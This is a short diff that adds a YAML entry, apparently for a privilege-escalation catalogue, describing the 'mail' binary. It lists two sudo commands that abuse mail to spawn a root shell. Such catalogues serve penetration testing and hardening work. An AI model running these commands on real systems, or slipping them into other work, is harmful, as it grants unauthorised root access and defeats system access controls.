@@ -1,0 +1,5 @@
+name: mail
+binary_path: /usr/bin/mail
+exploit_cmds:
+- sudo /usr/bin/mail --exec='!/bin/sh'
+- sudo /usr/bin/mail -f /etc/hosts && !/bin/sh
